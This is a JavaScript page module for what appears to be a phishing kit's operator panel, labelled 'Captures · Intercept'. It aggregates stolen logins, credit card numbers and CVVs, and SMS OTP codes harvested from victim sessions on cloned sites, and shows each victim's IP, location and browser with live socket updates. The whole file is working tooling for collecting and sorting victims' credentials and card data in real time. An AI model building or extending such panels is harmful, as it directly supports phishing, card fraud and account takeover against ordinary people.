/**
 * ALP - Captured Data Feed Manager
 * Aggregated feed of logins, credentials, credit cards, and OTPs.
 */
const CapturedDataPage = (() => {
  let socketListeners = [];
  let refreshTimer = null;
  let allSessions = [];
  let websites = [];
  let currentFilter = 'all'; // 'all', 'cc', 'login', 'otp', 'other'
  let searchRaw = '';
  let selectedWebsiteId = '';
  let currentView = 'cards'; // 'cards' | 'rows'

  function escapeHtml(s) {
    if (!s) return '';
    const d = document.createElement('div');
    d.textContent = String(s);
    return d.innerHTML;
  }

  function render() {
    return `
      <div class="captured-data-page page-enter">
        <div class="page-header">
          <div>
            <div class="ph" style="--ph-accent:#ef4444;--ph-glow:rgba(239,68,68,0.5)">
              <div class="ph-eyebrow"><span class="ph-eyebrow-dot"></span>CAPTURES · INTERCEPT</div>
              <h1 class="ph-title"><span class="ph-title-glyph">⬡</span><span class="ph-title-text">Captures</span></h1>
              <p class="ph-sub">Real-time aggregated feed of credentials, card details, and SMS OTP codes</p>
            </div>
          </div>
        </div>

        <!-- Toolbar / Filters -->
        <div class="cd-filter-bar">
          <div class="cd-filter-left">
            <!-- Website Selector -->
            <div class="cd-site-wrap">
              <span class="cd-site-lbl">Site:</span>
              <div id="data-website-container"></div>
            </div>

            <!-- Type Filters -->
            <div class="tab-filters">
              <button class="filter-tab active" data-filter="all">All</button>
              <button class="filter-tab" data-filter="cc">💳 Credit Cards</button>
              <button class="filter-tab" data-filter="login">🔐 Credentials</button>
              <button class="filter-tab" data-filter="otp">📱 OTP / SMS</button>
              <button class="filter-tab" data-filter="other">📝 Other Forms</button>
            </div>
          </div>

          <div class="cd-filter-right">
            <!-- Search -->
            <div class="cd-search-wrap">
              <input type="text" id="data-search-input" placeholder="Search captured data..." class="form-input cd-search-input" />
              <svg class="cd-search-ico" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
              </svg>
            </div>
            <!-- View Toggle -->
            <div class="view-toggle-group" id="view-toggle-group">
              <button class="view-toggle-btn active" data-view="cards" title="Card View">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
                Cards
              </button>
              <button class="view-toggle-btn" data-view="rows" title="Row View">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
                Rows
              </button>
            </div>
          </div>
        </div>

        <!-- Data Grid -->
        <div id="captured-data-grid">
          <div style="padding:16px 0; display:grid; grid-template-columns:repeat(auto-fill,minmax(min(280px,100%),1fr)); gap:16px;">
            ${[1,2,3,4,5,6].map(() => `<div class="alp-skeleton-card"><div class="alp-skeleton alp-skeleton--line" style="width:55%"></div><div class="alp-skeleton alp-skeleton--line" style="width:80%"></div><div class="alp-skeleton alp-skeleton--line" style="width:40%"></div></div>`).join('')}
          </div>
        </div>
      </div>

      <style>
        .captured-data-page { min-width: 0; }
        .captured-data-page .cd-filter-bar {
          display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between;
          margin-bottom: 24px; padding: 14px 18px; background: var(--bg-secondary);
          border: 1px solid var(--border-primary); border-radius: 12px; min-width: 0;
        }
        .captured-data-page .cd-filter-left {
          display: flex; flex-wrap: wrap; gap: 10px; align-items: center; min-width: 0; flex: 1 1 auto;
        }
        .captured-data-page .cd-site-wrap { display: flex; align-items: center; gap: 8px; min-width: 0; }
        .captured-data-page .cd-site-lbl { font-size: 11px; font-weight: 700; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; flex-shrink: 0; }
        .captured-data-page .cd-filter-right {
          display: flex; align-items: center; gap: 10px; flex-wrap: wrap; min-width: 0;
        }
        .captured-data-page .cd-search-wrap { position: relative; flex: 1 1 200px; min-width: 160px; max-width: 260px; }
        .captured-data-page .cd-search-input { height: 36px; padding: 0 12px 0 32px; font-size: 13px; width: 100%; }
        .captured-data-page .cd-search-ico { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: var(--text-muted); pointer-events: none; }
        .captured-data-page .tab-filters {
          display: flex; align-items: center; background: var(--bg-tertiary); border-radius: 8px;
          padding: 3px; gap: 4px; border: 1px solid var(--border-primary);
          max-width: 100%; overflow-x: auto; scrollbar-width: none; -webkit-overflow-scrolling: touch;
        }
        .captured-data-page .tab-filters::-webkit-scrollbar { display: none; }
        .captured-data-page .filter-tab {
          padding: 6px 12px; border: none; border-radius: 6px; font-size: 12.5px; font-weight: 500;
          cursor: pointer; font-family: 'Inter', sans-serif; background: transparent;
          color: var(--text-secondary); transition: all 0.15s; white-space: nowrap; flex-shrink: 0;
        }
        .captured-data-page .filter-tab.active { background: var(--accent-primary) !important; color: var(--text-inverse) !important; font-weight: 600; }
        .captured-data-page .filter-tab:hover:not(.active) { background: var(--bg-hover); color: var(--text-primary); }
        .captured-data-page .captured-card {
          background: var(--bg-secondary); border: 1px solid var(--border-primary); border-radius: 14px;
          padding: 18px; display: flex; flex-direction: column; justify-content: space-between; min-width: 0;
          box-shadow: var(--shadow-card); transition: all 0.2s; position: relative; overflow: hidden;
          animation: fadeUp 0.3s ease both;
        }
        .captured-data-page .captured-card:hover { border-color: color-mix(in oklab, var(--accent-primary) 40%, transparent); box-shadow: var(--shadow-card-lift); transform: translateY(-2px); }
        .captured-data-page .captured-card-header {
          display: flex; justify-content: space-between; align-items: flex-start; gap: 10px;
          border-bottom: 1px solid var(--border-subtle); padding-bottom: 12px; margin-bottom: 14px;
        }
        .captured-data-page .card-badge-website {
          display: inline-block; vertical-align: middle;
          background: color-mix(in oklab, var(--accent-primary) 12%, transparent);
          color: var(--accent-primary); font-size: 11px; font-weight: 600;
          padding: 3px 8px; border-radius: 6px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .captured-data-page .visitor-meta-line { font-size: 11.5px; color: var(--text-secondary); display: flex; align-items: center; gap: 6px; margin-top: 6px; }
        .captured-data-page .visitor-flag { font-size: 13px; vertical-align: middle; }
        .captured-data-page .captured-card-body { flex: 1; margin-bottom: 14px; min-height: 100px; min-width: 0; }
        .captured-data-page .captured-card-actions {
          display: flex; gap: 8px; border-top: 1px solid var(--border-subtle); padding-top: 12px; margin-top: auto;
        }
        .captured-data-page .card-action-btn {
          flex: 1; padding: 8px 12px; font-size: 11.5px; font-weight: 600; text-align: center;
          border-radius: 8px; cursor: pointer; font-family: 'Inter', sans-serif; display: flex;
          align-items: center; justify-content: center; gap: 6px; border: none; transition: all 0.15s;
        }
        .captured-data-page .card-btn-view { background: color-mix(in oklab, var(--accent-primary) 10%, transparent); color: var(--accent-primary); border: 1px solid color-mix(in oklab, var(--accent-primary) 22%, transparent); }
        .captured-data-page .card-btn-view:hover { background: color-mix(in oklab, var(--accent-primary) 18%, transparent); }
        .captured-data-page .card-btn-delete { background: rgba(239, 68, 68, 0.08); color: var(--color-danger); border: 1px solid rgba(239, 68, 68, 0.18); }
        .captured-data-page .card-btn-delete:hover { background: rgba(239, 68, 68, 0.16); }

        /* View Toggle */
        .captured-data-page .view-toggle-group { display:flex; background:var(--bg-tertiary); border:1px solid var(--border-primary); border-radius:8px; padding:3px; gap:3px; flex-shrink:0; }
        .captured-data-page .view-toggle-btn {
          display:inline-flex; align-items:center; gap:5px; padding:5px 11px;
          border:1px solid transparent; border-radius:6px; font-size:11.5px; font-weight:600;
          cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.15s;
          color:var(--text-muted); background:transparent;
        }
        .captured-data-page .view-toggle-btn:hover { color:var(--text-secondary); background:var(--bg-hover); }
        .captured-data-page .view-toggle-btn.active { background:color-mix(in oklab, var(--accent-primary) 14%, transparent); color:var(--accent-primary); border-color:color-mix(in oklab, var(--accent-primary) 26%, transparent); }

        /* Row / Table View */
        .captured-data-page .row-wrap {
          background: var(--bg-secondary); border: 1px solid var(--border-primary);
          border-radius: 12px; overflow-x: auto; -webkit-overflow-scrolling: touch; max-width: 100%;
        }
        .captured-data-page .captured-rows-table { width:100%; min-width:580px; border-collapse:collapse; }
        .captured-data-page .captured-rows-table thead th {
          text-align:left; font-size:10.5px; font-weight:700; color:var(--text-muted);
          text-transform:uppercase; letter-spacing:0.6px; padding:10px 14px;
          border-bottom:1px solid var(--border-primary);
          background:var(--bg-tertiary); white-space:nowrap;
        }
        .captured-data-page .captured-rows-table tbody tr {
          border-bottom:1px solid var(--border-subtle); transition:background 0.12s;
          animation:fadeUp 0.25s ease both;
        }
        .captured-data-page .captured-rows-table tbody tr:hover { background:var(--bg-hover); }
        .captured-data-page .captured-rows-table td { padding:11px 14px; font-size:12.5px; color:var(--text-primary); vertical-align:middle; }
        .captured-data-page .row-type-badge {
          display:inline-flex; align-items:center; gap:5px; padding:3px 9px; border-radius:20px;
          font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; white-space:nowrap;
        }
        .captured-data-page .row-type-cc    { background:rgba(245,158,11,.12); color:var(--color-warning); border:1px solid rgba(245,158,11,.25); }
        .captured-data-page .row-type-login { background:rgba(59,130,246,.12); color:var(--color-info); border:1px solid rgba(59,130,246,.25); }
        .captured-data-page .row-type-otp   { background:rgba(16,185,129,.12); color:var(--color-success); border:1px solid rgba(16,185,129,.25); }
        .captured-data-page .row-type-other { background:var(--bg-tertiary); color:var(--text-secondary); border:1px solid var(--border-primary); }
        .captured-data-page .row-fields-summary { display:inline-block; vertical-align:middle; font-size:11.5px; color:var(--text-secondary); font-family:var(--font-mono); max-width:300px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .captured-data-page .row-time { font-size:11px; color:var(--text-muted); white-space:nowrap; }
        .captured-data-page .row-action-btn {
          display:inline-flex; align-items:center; gap:4px; padding:5px 10px;
          border-radius:6px; font-size:11px; font-weight:600; cursor:pointer;
          font-family:'Inter',sans-serif; transition:all 0.12s;
          background:color-mix(in oklab, var(--accent-primary) 10%, transparent);
          color:var(--accent-primary); border:1px solid color-mix(in oklab, var(--accent-primary) 22%, transparent);
        }
        .captured-data-page .row-action-btn:hover { background:color-mix(in oklab, var(--accent-primary) 18%, transparent); }
        @media (max-width: 768px) {
          .captured-data-page .cd-filter-bar { padding: 12px; gap: 10px; }
          .captured-data-page .cd-filter-right { width: 100%; }
          .captured-data-page .cd-search-wrap { max-width: none; flex: 1 1 180px; }
          .captured-data-page .captured-rows-table { min-width: 420px; }
          .captured-data-page .captured-rows-table th:nth-child(4),
          .captured-data-page .captured-rows-table td:nth-child(4) { display: none; }
        }
        @media (max-width: 480px) {
          .captured-data-page .cd-site-wrap { width: 100%; }
          .captured-data-page .cd-site-wrap #data-website-container { flex: 1; min-width: 0; }
          .captured-data-page .captured-card { padding: 14px; }
        }
        @keyframes fadeUp { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
      </style>
    `;
  }

  function getCapturedItems() {
    const items = [];
    allSessions.forEach(s => {
      let metadata = {};
      try {
        const raw = s.metadata;
        if (raw && typeof raw === 'object') {
          metadata = raw;
        } else if (typeof raw === 'string' && raw.trim()) {
          metadata = JSON.parse(raw);
        }
      } catch { metadata = {}; }

      if (metadata.formData && Array.isArray(metadata.formData)) {
        metadata.formData.forEach(entry => {
          const fields = entry.fields || {};
          const page = (entry.page || '').toLowerCase();
          
          let type = 'other';
          const keys = Object.keys(fields);
          const hasCCKeys = keys.some(k => ['card_number', 'ccnumb', 'card', 'cc_number', 'cardNumber', 'cvv', 'cccvv', 'cvc', 'security_code'].includes(k));
          if (page.includes('/cc') || hasCCKeys) {
            type = 'cc';
          } else if (page.includes('/login') || (keys.includes('email') && keys.includes('password')) || (keys.includes('username') && keys.includes('password'))) {
            type = 'login';
          } else if (page.includes('/otp') || keys.includes('otp_code') || keys.includes('code')) {
            type = 'otp';
          }

          items.push({
            session: s,
            entry: entry,
            type: type,
            timestamp: new Date(entry.timestamp || s.last_activity).getTime()
          });
        });
      }
    });

    items.sort((a, b) => b.timestamp - a.timestamp);
    return items;
  }

  const TYPE_META = {
    cc:    { label: '💳 Card',       cls: 'row-type-cc'    },
    login: { label: '🔐 Login',      cls: 'row-type-login'  },
    otp:   { label: '📱 OTP',        cls: 'row-type-otp'    },
    other: { label: '📝 Form',       cls: 'row-type-other'  },
  };

  function fieldsSummary(fields) {
    return Object.entries(fields || {})
      .map(([k, v]) => `${k}: ${String(v).slice(0, 30)}`)
      .slice(0, 4).join(' · ');
  }

  function renderGrid() {
    const grid = document.getElementById('captured-data-grid');
    if (!grid) return;

    const items = getCapturedItems();

    const filtered = items.filter(item => {
      if (selectedWebsiteId && String(item.session.website_id) !== String(selectedWebsiteId)) return false;
      if (currentFilter !== 'all' && item.type !== currentFilter) return false;
      if (searchRaw) {
        const query = searchRaw.toLowerCase().trim();
        const ip = (item.session.ip_address || '').toLowerCase();
        const country = (item.session.country || '').toLowerCase();
        const city = (item.session.city || '').toLowerCase();
        const website = (item.session.website_name || '').toLowerCase();
        const page = (item.entry.page || '').toLowerCase();
        let fieldsMatch = false;
        for (const [k, v] of Object.entries(item.entry.fields || {})) {
          if (k.toLowerCase().includes(query) || String(v).toLowerCase().includes(query)) { fieldsMatch = true; break; }
        }
        if (!ip.includes(query) && !country.includes(query) && !city.includes(query) && !website.includes(query) && !page.includes(query) && !fieldsMatch) return false;
      }
      return true;
    });

    const emptyHtml = `
      <div style="grid-column:1 / -1; text-align:center; padding:60px 20px; color:var(--text-tertiary);">
        <div style="font-size:48px; margin-bottom:16px;">🔍</div>
        <p style="font-size:14px; font-weight:600; color:var(--text-secondary); margin:0 0 4px 0;">No Captured Data Found</p>
        <p style="font-size:12px; color:var(--text-muted); margin:0;">Try adjusting your filters or search query.</p>
      </div>`;

    if (filtered.length === 0) { grid.innerHTML = emptyHtml; return; }

    if (currentView === 'rows') {
      // ── Table / Row view ──
      const rows = filtered.map(item => {
        const s = item.session;
        const entry = item.entry;
        const tm = TYPE_META[item.type] || TYPE_META.other;
        const flagEmoji = s.country ? SessionTemplates.countryFlag(s.country) : '🌐';
        const timeStr = entry.timestamp
          ? new Date(entry.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
          : '—';
        const dateSt = entry.timestamp
          ? new Date(entry.timestamp).toLocaleDateString([], { month: 'short', day: 'numeric' })
          : '';
        const summary = fieldsSummary(entry.fields);
        return `
          <tr data-sid="${s.id}">
            <td><span class="row-type-badge ${tm.cls}">${tm.label}</span></td>
            <td><span class="card-badge-website" style="font-size:10px;">${escapeHtml(s.website_name || '—')}</span></td>
            <td><span style="font-family:monospace; font-size:11.5px;">${flagEmoji} ${escapeHtml(s.ip_address || '—')}</span></td>
            <td><span class="row-fields-summary">${escapeHtml(summary) || '<span style="color:var(--text-placeholder);">—</span>'}</span></td>
            <td><span class="row-time">${dateSt}<br>${timeStr}</span></td>
            <td style="white-space:nowrap;">
              <button class="row-action-btn card-btn-view" data-sid="${s.id}">👁 View</button>
              <button class="row-action-btn card-btn-delete" data-sid="${s.id}" style="margin-left:5px; background:rgba(239,68,68,.08); color:#f87171; border-color:rgba(239,68,68,.18);">🗑</button>
            </td>
          </tr>`;
      }).join('');

      grid.innerHTML = `
        <div class="row-wrap">
          <table class="captured-rows-table">
            <thead>
              <tr>
                <th>Type</th><th>Site</th><th>IP</th><th>Data</th><th>Time</th><th>Actions</th>
              </tr>
            </thead>
            <tbody>${rows}</tbody>
          </table>
        </div>`;
    } else {
      // ── Cards view (default) ──
      grid.style.display = 'grid';
      grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(min(340px, 100%), 1fr))';
      grid.style.gap = '16px';
      grid.innerHTML = filtered.map(item => {
        const s = item.session;
        const entry = item.entry;
        const timeStr = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date(s.last_activity).toLocaleString();
        const flagEmoji = s.country ? `<span class="visitor-flag" title="${escapeHtml(s.country)}">${SessionTemplates.countryFlag(s.country)}</span>` : '🌐';
        const browser = s.browser || 'Unknown';
        const os = s.os || 'Unknown';
        const bodyHtml = SessionTemplates.renderFormData({ formData: [entry] }, { hideWrapperHeader: true });
        return `
          <div class="captured-card" data-session-id="${s.id}">
            <div class="captured-card-header">
              <div>
                <span class="card-badge-website">${escapeHtml(s.website_name || 'Website')}</span>
                <div class="visitor-meta-line">
                  ${flagEmoji}
                  <strong style="color:var(--text-primary); font-family:monospace;">${escapeHtml(s.ip_address || '0.0.0.0')}</strong>
                </div>
                <div style="font-size:10px; color:var(--text-muted); margin-top:4px;">${escapeHtml(browser)} on ${escapeHtml(os)}</div>
              </div>
              <div style="font-size:10.5px; color:var(--text-muted); font-style:italic; text-align:right;">
                ${timeStr.split(',')[1] || timeStr}
                <div style="font-size:9.5px; margin-top:4px; font-family:monospace;">${escapeHtml(s.id.slice(0, 8))}</div>
              </div>
            </div>
            <div class="captured-card-body">${bodyHtml}</div>
            <div class="captured-card-actions">
              <button class="card-action-btn card-btn-view" data-sid="${s.id}">👁️ View Session</button>
              <button class="card-action-btn card-btn-delete" data-sid="${s.id}">🗑️ Delete</button>
            </div>
          </div>`;
      }).join('');
    }

    // Reset grid layout for row view
    if (currentView === 'rows') {
      grid.style.display = 'block';
      grid.style.gridTemplateColumns = '';
      grid.style.gap = '';
    }

    // Attach click events
    grid.querySelectorAll('.card-btn-view').forEach(btn => {
      btn.addEventListener('click', (e) => { e.stopPropagation(); window.SessionDrawer.open(btn.dataset.sid); });
    });
    grid.querySelectorAll('.card-btn-delete').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const sid = btn.dataset.sid;
        window.showModal({
          title: 'Delete Session',
          content: `<p>Are you sure you want to permanently delete session <strong>${sid.slice(0,8)}</strong>? All captured data and history will be lost.</p>`,
          type: 'danger',
          onConfirm: async () => {
            try {
              await window.ALPApi.deleteSession(sid);
              window.showToast('Session and captured data deleted', 'success');
              allSessions = allSessions.filter(s => s.id !== sid);
              renderGrid();
            } catch (err) { window.showToast('Failed to delete: ' + err.message, 'error'); }
          }
        });
      });
    });
  }

  async function loadWebsites() {
    try {
      const data = await window.ALPApi.getWebsites();
      websites = data.websites || data || [];
      
      window.ALPWebsiteSelect.create({
        containerId: 'data-website-container',
        hiddenInputId: 'data-website-select-hidden',
        websites: websites,
        placeholder: 'All Websites',
        selectedValue: selectedWebsiteId,
        onChange: (val) => {
          selectedWebsiteId = val;
          renderGrid();
        }
      });
    } catch (e) { console.error('Load websites:', e); }
  }

  async function loadSessions() {
    try {
      const data = await window.ALPApi.getSessions({ limit: 150 });
      allSessions = data.sessions || data || [];
      renderGrid();
    } catch (e) { console.error('Load sessions:', e); }
  }

  function init() {
    loadSessions();
    loadWebsites();

    // Auto-refresh timer
    refreshTimer = setInterval(loadSessions, 15000);

    // Tabs
    const tabs = document.querySelectorAll('.filter-tab');
    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        currentFilter = tab.dataset.filter;
        renderGrid();
      });
    });

    // Search input
    const searchInput = document.getElementById('data-search-input');
    if (searchInput) {
      searchInput.addEventListener('input', (e) => {
        searchRaw = e.target.value;
        renderGrid();
      });
    }

    // View toggle
    const viewBtns = document.querySelectorAll('.view-toggle-btn');
    viewBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        viewBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentView = btn.dataset.view;
        renderGrid();
      });
    });

    // Socket real-time events
    if (window.ALPSocket) {
      const onSessionUpdate = (session) => {
        const idx = allSessions.findIndex(s => s.id === session.id);
        if (idx >= 0) {
          allSessions[idx] = session;
        } else {
          allSessions.unshift(session);
        }
        renderGrid();
      };
      window.ALPSocket.on('admin:session:update', onSessionUpdate);
      socketListeners.push(['admin:session:update', onSessionUpdate]);

      const onNewSession = (session) => {
        const idx = allSessions.findIndex(s => s.id === session.id);
        if (idx < 0) {
          allSessions.unshift(session);
          renderGrid();
        }
      };
      window.ALPSocket.on('admin:session:new', onNewSession);
      socketListeners.push(['admin:session:new', onNewSession]);

      const onSessionEnd = (data) => {
        const idx = allSessions.findIndex(s => s.id === data.sessionId);
        if (idx >= 0) {
          allSessions[idx].is_active = false;
          renderGrid();
        }
      };
      window.ALPSocket.on('admin:session:end', onSessionEnd);
      socketListeners.push(['admin:session:end', onSessionEnd]);
    }
  }

  function destroy() {
    if (refreshTimer) { clearInterval(refreshTimer); refreshTimer = null; }
    if (window.ALPSocket) {
      socketListeners.forEach(([ev, fn]) => window.ALPSocket.off(ev, fn));
    }
    socketListeners = [];
    allSessions = [];
    websites = [];
  }

  return { render, init, destroy };
})();

if (typeof window !== 'undefined') {
  window.CapturedDataPage = CapturedDataPage;
}
